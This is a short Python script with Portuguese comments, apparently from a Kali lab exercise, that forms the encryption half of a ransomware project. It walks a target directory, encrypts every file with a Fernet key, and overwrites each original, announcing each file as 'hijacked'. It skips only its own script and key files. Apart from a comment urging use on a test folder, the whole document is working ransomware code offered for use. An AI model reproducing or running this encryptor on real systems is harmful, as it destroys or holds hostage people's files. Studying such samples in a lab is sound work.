import os
from cryptography.fernet import Fernet

def load_key():
    return open("secret.key", "rb").read()

def encrypt_files(directory):
    key = load_key()
    fernet = Fernet(key)

    # Itera sobre os arquivos no diretório alvo
    for root, dirs, files in os.walk(directory):
        for file in files:
            # Evita cifrar o próprio script ou a chave
            if file in ["Crypt.py", "secret.key", "Decrypt.py", "key-gen.py"]:
                continue
                
            file_path = os.path.join(root, file)
            
            # 1. Lê os dados originais
            with open(file_path, "rb") as f:
                data = f.read()
            
            # 2. Criptografa os dados
            encrypted_data = fernet.encrypt(data)
            
            # 3. Sobrescreve o arquivo com os dados cifrados
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            
            print(f"[-] Arquivo {file} foi sequestrado (cifrado).")

if __name__ == "__main__":
    # IMPORTANTE: Use uma pasta de testes específica para não danificar seu sistema!
    target_dir = "/home/kali/alvo"
    if os.path.exists(target_dir):
        encrypt_files(target_dir)
        print("\n⚠️ Todos os arquivos no diretório de teste foram cifrados.")
    else:
        print("Erro: Crie a pasta './alvo_do_teste' com alguns arquivos .txt dentro primeiro.")